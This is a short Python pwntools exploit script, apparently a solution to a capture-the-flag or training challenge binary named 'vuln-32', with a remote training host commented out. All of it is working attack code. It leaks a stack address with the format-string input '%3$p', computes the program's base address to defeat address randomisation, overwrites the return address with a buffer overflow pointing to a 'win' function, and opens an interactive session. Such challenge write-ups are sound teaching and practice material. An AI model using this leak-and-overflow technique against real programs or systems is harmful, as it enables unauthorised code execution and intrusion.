from pwn import *
from time import sleep

EX_NAME = './vuln-32'

elf = ELF(EX_NAME)
context.arch = 'x86'
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    # p = remote('leakers.training.offensivedefensive.it', 8080, ssl=True)
    print('NO REMOTE!')
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug(EX_NAME, api=True, gdbscript='''
        c
        ''')
    else:
        p = elf.process()

def dbg_stop():
    if 'GDB' in os.environ:
        input('Waiting...')

WIN = 0x0001126d

sleep(0.5)
log.info(p.clean())

# Leak address
sleep(0.5)
p.sendline(b'%3$p')
t = p.clean()
log.info(t)
t = t[t.find(b'0x'):].split(b'\n')[0]
leak = int(t, 16)
log.success(f'leak: {hex(leak)}')

# Calc base addr
elf.address = leak - (0x565561d5 - 0x56555000)

# Buffer overflow
sleep(0.5)
p.sendline(b'A'*0x20 + p32(elf.sym['win']))

sleep(0.5)
log.success(p.clean())

p.interactive()
